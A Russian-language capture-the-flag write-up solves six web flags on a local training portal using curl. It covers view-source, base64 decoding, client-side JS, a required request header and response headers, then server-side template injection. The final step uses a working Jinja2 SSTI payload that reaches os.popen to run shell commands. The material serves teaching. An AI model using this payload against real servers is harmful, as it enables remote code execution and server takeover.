# Разбор: Портал (web)

Шесть флагов, по одному базовому приёму веб-категории. Ниже — реальные команды против
локальной копии (`http://127.0.0.1:8001`), поэтому в выводе видны флаги вида
`BootCTF{default_...}`. На боевом стенде преподавателя адрес и значения флагов другие,
но приёмы те же. Инструменты (`curl`, `base64`) есть в образе `ctf-toolbox`.

## Флаг 1. Заметка в исходном коде страницы

Браузер показывает готовую страницу, но сервер отдаёт исходный HTML — в нём бывает
больше, чем видно. Смотрим исходник (`curl` или Ctrl+U в браузере):

```console
$ curl -s http://127.0.0.1:8001/ | grep note-01
  <!-- note-01: Qm9vdENURntkZWZhdWx0X3dlYl92aWV3X3NvdXJjZX0= -->
```

В комментарии — строка в base64 (кодирование, не шифрование). Декодируем:

```console
$ curl -s http://127.0.0.1:8001/ | grep -o 'note-01: [A-Za-z0-9+/=]*' | sed 's/note-01: //' | base64 -d
BootCTF{default_web_view_source}
```

*Чему учит:* первый шаг веб-разбора — смотреть, что реально отдаёт сервер. Комментарии
и «забытые» данные в HTML — классическая утечка.

## Флаг 2. Код символов в клиентском скрипте

Страница подгружает `/js/app.js`. Читаем его:

```console
$ curl -s http://127.0.0.1:8001/js/app.js
// Портал клиента — интерфейсные мелочи.
(function () {
  "use strict";

  // Служебная заметка аудита: показывается по Ctrl+Shift+Y.
  var note = [66, 111, 111, 116, 67, 84, 70, 123, 100, 101, 102, 97, 117, 108, 116, 95, 119, 101, 98, 95, 104, 111, 116, 107, 101, 121, 95, 106, 115, 125];

  document.addEventListener("keydown", function (e) {
    if (e.ctrlKey && e.shiftKey && (e.key === "Y" || e.key === "y")) {
      e.preventDefault();
      var text = String.fromCharCode.apply(null, note);
      window.alert(text);
    }
  });
})();
```

Обработчик реагирует на Ctrl+Shift+Y и показывает строку из кодов символов. Нажмите
хоткей в браузере — всплывёт окно с флагом, либо соберите строку из массива:

```console
$ curl -s http://127.0.0.1:8001/js/app.js | grep -o 'note = \[[0-9, ]*\]' | sed 's/note = \[//;s/\]//' | tr ',' '\n' | awk '{printf "%c",$1}'; echo
BootCTF{default_web_hotkey_js}
```

*Чему учит:* логика и «секреты» на стороне клиента (в JS) доступны любому пользователю.
Прятать данные в скрипте — не защита.

## Флаг 3. Служебный API и обязательный заголовок

Какие адреса сервис не хочет показывать поисковикам — подсказывает `/robots.txt`:

```console
$ curl -s http://127.0.0.1:8001/robots.txt
User-agent: *
Disallow: /api/secret
```

Обращаемся к `/api/secret`. Обычный GET отклонён (405 — метод не разрешён):

```console
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8001/api/secret
405
$ curl -s -X POST http://127.0.0.1:8001/api/secret
{"error": "нужен заголовок X-Audit-Token (см. памятку аудитора)"}
```

Сервер сам подсказал нужный заголовок. Добавляем его:

```console
$ curl -s -X POST -H 'X-Audit-Token: lighthouse' http://127.0.0.1:8001/api/secret
{"flag": "BootCTF{default_web_api_header}"}
```

*Чему учит:* `curl` позволяет управлять методом и заголовками запроса — то, что не
сделать адресной строкой браузера. API часто проверяют заголовки, а не только путь.

## Флаг 4. Внедрение в шаблон на стороне сервера (SSTI)

Портал здоровается по имени: `/hello?name=Имя`. Проверим, не подставляется ли ввод прямо
в шаблон — передадим выражение `{{7*7}}` (в адресе фигурные скобки кодируются как
`%7B%7B` и `%7D%7D`):

```console
$ curl -s "http://127.0.0.1:8001/hello?name=%7B%7B7*7%7D%7D"
<p>Здравствуйте, 49!</p>
```

Вместо `{{7*7}}` вернулось `49` — сервер вычислил выражение. Это внедрение в шаблон на
стороне сервера (server-side template injection, SSTI). Запрашиваем конфигурацию
приложения:

```console
$ curl -s "http://127.0.0.1:8001/hello?name=%7B%7Bconfig%7D%7D" | grep -o "AUDIT_NOTE[^}]*}"
AUDIT_NOTE&#39;: &#39;BootCTF{default_web_ssti_config}
```

(HTML-сущности `&#39;` — это экранированные кавычки.) Флаг лежал в `app.config` под
ключом `AUDIT_NOTE`.

*Чему учит:* если пользовательский ввод попадает в шаблон без экранирования, атакующий
исполняет выражения движка шаблонов. Отсюда один шаг до чтения файлов и выполнения кода.

## Флаг 5. Нестандартный заголовок ответа

Браузер обычно не показывает заголовки ответа. Посмотрим их целиком (`curl -i`):

```console
$ curl -s -D - -o /dev/null http://127.0.0.1:8001/ | grep -i x-lighthouse
X-Lighthouse-Note: BootCTF{default_web_response_header}
```

*Чему учит:* ответ сервера — это не только тело страницы, но и заголовки; там тоже
бывают утечки. Привычка смотреть `curl -i` / вкладку «Сеть» DevTools.

## Флаг 6. От SSTI к удалённому выполнению кода

SSTI из флага 4 — это не только арифметика. Через внутренние объекты движка шаблонов
можно добраться до модуля `os` и выполнить команду на сервере. Прочитаем файл
`/flag.txt` в контейнере:

```console
$ curl -s "http://127.0.0.1:8001/hello?name=%7B%7B+cycler.__init__.__globals__.os.popen('cat%20/flag.txt').read()+%7D%7D"
<p>Здравствуйте, BootCTF{default_web_ssti_rce}
!</p>
```

Выражение `cycler.__init__.__globals__.os.popen('cat /flag.txt').read()` проходит от
доступного в шаблоне объекта к глобальному пространству имён, оттуда к `os.popen` и
выполняет команду — это уже удалённое выполнение кода (remote code execution, RCE).

*Чему учит:* SSTI в реальных приложениях приводит к полному контролю над сервером.
Поэтому пользовательский ввод никогда не подставляют в шаблон как есть.
